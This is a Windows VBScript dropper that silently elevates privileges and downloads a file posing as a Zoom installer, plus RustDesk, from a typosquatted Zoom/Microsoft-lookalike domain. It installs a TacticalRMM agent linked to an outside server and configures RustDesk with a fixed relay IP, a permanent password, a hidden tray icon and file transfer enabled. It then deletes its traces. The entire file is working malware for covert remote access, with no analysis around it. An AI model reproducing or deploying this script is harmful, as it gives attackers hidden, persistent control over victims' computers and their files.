Set objShell = CreateObject("Shell.Application")
Set objWShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Check for admin rights, elevate if needed
If Not objWShell.Run("cmd /c net session >nul 2>&1", 0, True) = 0 Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 0
    WScript.Quit
End If

Dim tmpFolder
tmpFolder = objWShell.ExpandEnvironmentStrings("%TEMP%")

' =====================================================================
' STEP 1 - Download and install TacticalRMM agent
' =====================================================================
Dim trmmExe
trmmExe = tmpFolder & "\ZoomInstaller.exe"

objWShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomInstaller.exe' -OutFile '" & trmmExe & "' -UseBasicParsing""", 0, True
objWShell.Run "powershell -WindowStyle Hidden -Command ""Unblock-File -Path '" & trmmExe & "'""", 0, True
objWShell.Run Chr(34) & trmmExe & Chr(34) & " /VERYSILENT /SUPPRESSMSGBOXES", 0, True

' Wait for TacticalRMM to finish installing
objWShell.Run "cmd /c ping 127.0.0.1 -n 10 >nul", 0, True

objWShell.Run "powershell -WindowStyle Hidden -Command ""Start-Process '" & Chr(34) & "C:\Program Files\TacticalAgent\tacticalrmm.exe" & Chr(34) & "' -ArgumentList '-m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth e88d652cb5e09ed94a4572bbe3ec29b4c0046d0c4ce67e9ae4712faaa8bf3e53 --rdp --ping' -WindowStyle Hidden -Wait""", 0, True

' =====================================================================
' STEP 2 - Download and install RustDesk silently
' =====================================================================
Dim rdExe
rdExe = tmpFolder & "\rustdesk.exe"

objWShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/rustdesk.exe' -OutFile '" & rdExe & "' -UseBasicParsing""", 0, True
objWShell.Run "powershell -WindowStyle Hidden -Command ""Unblock-File -Path '" & rdExe & "'""", 0, True
objWShell.Run Chr(34) & rdExe & Chr(34) & " --silent-install", 0, True

' Wait for RustDesk to finish installing
objWShell.Run "cmd /c ping 127.0.0.1 -n 8 >nul", 0, True

' =====================================================================
' STEP 3 - Configure RustDesk (server, key, password, hide tray)
' =====================================================================
Dim rdConfig
rdConfig = objWShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\RustDesk\config\RustDesk.toml"

Dim rdDir
rdDir = objWShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\RustDesk\config"

' Create config directory if it doesn't exist
If Not objFSO.FolderExists(rdDir) Then
    objFSO.CreateFolder(rdDir)
End If

' Write RustDesk config
Dim configContent
configContent = "rendezvous_server = '5.252.53.47'" & vbCrLf & _
                "nat_type = 1" & vbCrLf & _
                "serial = 0" & vbCrLf & _
                "" & vbCrLf & _
                "[options]" & vbCrLf & _
                "custom-rendezvous-server = '5.252.53.47'" & vbCrLf & _
                "relay-server = '5.252.53.47'" & vbCrLf & _
                "key = 'B68aubcLU4OOUeV1xt4oElH45kjNK7Hoqc3ReivfgW0='" & vbCrLf & _
                "stop-service = 'N'" & vbCrLf & _
                "allow-remote-config-modification = 'Y'" & vbCrLf & _
                "enable-file-transfer = 'Y'" & vbCrLf & _
                "hide-tray = 'Y'" & vbCrLf & _
                "auto-disconnect-timeout = ''" & vbCrLf & _
                "approve-mode = 'password'" & vbCrLf & _
                "verification-method = 'use-permanent-password'"

Dim objFile
Set objFile = objFSO.CreateTextFile(rdConfig, True)
objFile.Write configContent
objFile.Close

' Write permanent password
Dim pwConfig
pwConfig = objWShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\RustDesk\config\RustDesk2.toml"

Dim pwContent
pwContent = "salt = 'abcdefghij1234567890abcd'" & vbCrLf & _
            "password = 'Rustdesk$45.'"

Set objFile = objFSO.CreateTextFile(pwConfig, True)
objFile.Write pwContent
objFile.Close

' =====================================================================
' STEP 4 - Restart RustDesk service to apply config
' =====================================================================
objWShell.Run "cmd /c net stop RustDesk >nul 2>&1", 0, True
objWShell.Run "cmd /c ping 127.0.0.1 -n 3 >nul", 0, True
objWShell.Run "cmd /c net start RustDesk >nul 2>&1", 0, True

' =====================================================================
' STEP 5 - Cleanup temp files
' =====================================================================
If objFSO.FileExists(trmmExe) Then objFSO.DeleteFile trmmExe, True
If objFSO.FileExists(rdExe) Then objFSO.DeleteFile rdExe, True

WScript.Quit
